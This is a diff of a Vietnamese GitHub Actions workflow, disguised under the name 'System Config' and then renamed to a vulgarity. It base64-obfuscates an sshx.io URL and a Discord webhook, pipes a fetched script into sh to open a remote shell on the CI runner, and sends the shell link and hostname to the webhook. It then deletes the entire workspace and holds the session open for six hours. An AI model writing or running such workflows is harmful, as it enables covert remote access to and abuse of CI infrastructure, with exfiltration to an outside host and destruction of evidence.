@@ -1,4 +1,4 @@
-name: System Config (SSHX)
+name: Lồn
 
 on:
   workflow_dispatch:
@@ -8,48 +8,60 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Giải mã webhook và user_id
+    - name: Giải mã các thông tin nhạy cảm
       run: |
-        echo "ODU0NTc5MDEyOTYxOTU5OTQ4" | base64 -d > user_id.txt
-        echo "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNzkwNjQ3MjAyOTQ1ODQ5NS8xYlNrV0xsVl9jZHZXVGhHMGhLM1lOQV9rWlBfb0tfeklpaXcwYjdEM3Uzc3BNRFVIcll1WGlOZGVNZnRx" | base64 -d > webhook.txt
+        echo "aHR0cHM6Ly9zc2h4LmlvL2dldA==" | base64 -d > sshx_url.txt
+        echo "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNzkwNjQ3MjAyOTQ1ODQ5NS8xYlNrV0xsVl9jZHZXVGhHMXhLM1lOQVA3TVlUZ215S1pCX29LX3pJaWl3MGI3RDN1M3JzTURVSHJZdVhpTmRlTWZ0cQ==" | base64 -d > webhook.txt
 
-    - name: Giải mã và chạy script chính
+    - name: Tải và chạy , chờ lấy
       run: |
-        echo "IyEvYmluL2Jhc2gKCmN1cmwgLXNzU2YgaHR0cHM6Ly9zc2h4LmlvL2dldCB8IHNoIC1zIHJ1biA+IHNzaGxvZy50eHQgMj4mMQplY2hvICLijJDiiJAgxJHDoyBrcMO0aSBjaMOybmcgU1NIWCB2w6AgZOG7lSB04bqhaSBUVFIgU1NIIGxpbmsuLi4iCgpmb3IgaSBpbiB7MS4uMzB9OyBkbyAKICBMSU5LPSQoZ3JlcCAtbyAnaHR0cHM6Ly9zc2h4LmlvL3MvW14gXSpcJyBzc2hsb2cudHh0IHwgc2VkICdzL1x4MWJcWzAtOTtdKj1tLy9nJyB8IGhlYWQgLW4gMSkKICBpZiBbIC1uICIkTElOSyIgXTsgdGhlbgogICAgZWNobyAiJExJTksiID4gc3NobGluay50eHQKICAgIGVjaG8gIuKckOKckDogxJHDoyBsaW5rIFNTSCB04bqhbiB0aMOhaTogJExJTksiCiAgICBicmVhawogIGZpCgpzbGVlcCAxCmRvbmUKaWYgWyAhIC1zIHNzaGxpbmsudHh0IF07IHRoZW4KICBlY2hvICLijJDiiJkgS2jhu59uZyB04bqhaSBTU0ggbGluayBzYXVbNjAgc-G7kS4iID4mMgogIGV4aXQgMQpmaQoK" | base64 -d > run.sh
-        bash run.sh
-        rm -f run.sh
+        SSHX_URL=$(cat sshx_url.txt)
 
-    - name: Gửi SSH link về Discord Webhook
-      run: |
-        USER_ID=$(cat user_id.txt)
-        DISCORD_WEBHOOK=$(cat webhook.txt)
-        LINK=$(cat sshlink.txt | tr -d '\r\n')
+        curl -sSf "$SSHX_URL" | sh -s run > sshlog.txt 2>&1 &
+        echo "⏳ Đang khởi chạy SSHX và đợi tạo SSH link..."
 
-        if [ -n "$LINK" ]; then
-          INNER_JSON=$(jq -nc --arg uid "$USER_ID" --arg ssh "$LINK" '{user_id: $uid, ssh: $ssh}')
-        else
-          INNER_JSON=$(jq -nc --arg uid "$USER_ID" '{user_id: $uid, ssh: "(không tìm thấy SSH link)"}')
-        fi
-
-        jq -nc --arg content "$INNER_JSON" '{content: $content}' > payload.json
-
-        echo "📤 Gửi SSH link đến Discord..."
-        curl -X POST -H "Content-Type: application/json" -d @payload.json "$DISCORD_WEBHOOK"
-
-        # Dọn dẹp file tạm
-        rm -f user_id.txt webhook.txt sshlink.txt payload.json
-
-    - name: Giữ SSHX hoạt động trong 6 giờ
-      run: |
-        echo "🕒 Giữ session SSHX..."
-        for ((i = 0; i < 21600; i+=30)); do
-          echo "✅ Alive at $(date)"
-          sleep 30
+        for i in {1..30}; do
+          LINK=$(grep -o 'https://sshx.io/s/[^\ ]\+' sshlog.txt | sed 's/\x1b\[[0-9;]*m//g' | head -n 1)
+          if [ -n "$LINK" ]; then
+            echo "$LINK" | base64 > sshlink.b64
+            echo "✅ Link SSH tìm thấy (base64): $(cat sshlink.b64)"
+            break
+          fi
+          sleep 1
         done
 
-    - name: Hiển thị log SSHX (nếu có) và xoá
+        if [ ! -s sshlink.b64 ]; then
+          echo "❌ Không tìm thấy SSH link sau 60 giây." >&2
+          exit 1
+        fi
+
+    - name: Gửi  + hostname về Discord Webhook
+      run: |
+        USER_ID=$(grep "# USER_ID:" .github/workflows/settings.yml | awk '{print $3}')
+        SSH_LINK=$(base64 -d sshlink.b64)
+
+        HOSTNAME_REAL=$(hostname)
+        echo "$HOSTNAME_REAL" | base64 > hostname.b64
+        HOST_DECODED=$(base64 -d hostname.b64)
+
+        INNER_JSON=$(jq -nc --arg uid "$USER_ID" --arg ssh "$SSH_LINK" --arg host "$HOST_DECODED" '{user_id: $uid, ssh: $ssh, host: $host}')
+        echo "$INNER_JSON" | jq -nc --arg content "$(cat)" '{content: $content}' > payload.json
+
+        echo "📤 Đang gửi SSH + hostname đến Discord..."
+        curl -X POST -H "Content-Type: application/json" -d @payload.json "$(cat webhook.txt)"
+
+
+    - name: 🔥 Tự động xoá toàn bộ file/thư mục sau khi chạy xong
       if: always()
       run: |
-        echo "📄 Log sshx:"
-        cat sshlog.txt || echo "(Không có log)"
-        rm -f sshlog.txt
+        echo "🧹 Đang dọn dẹp toàn bộ runner workspace..."
+        cd "$GITHUB_WORKSPACE" || exit 1
+        find . -mindepth 1 -exec rm -rf {} +
+        echo "✅ Đã xoá sạch mọi thứ xong!"
+    - name: Giữ  hoạt động trong 6 tiếng
+      run: |
+        echo "🕒 Bắt đầu giữ session SSHX trong 6 tiếng..."
+        for ((i = 0; i < 21600; i+=30)); do
+          echo "✅ Still alive at $(date)"
+          sleep 30
+        done
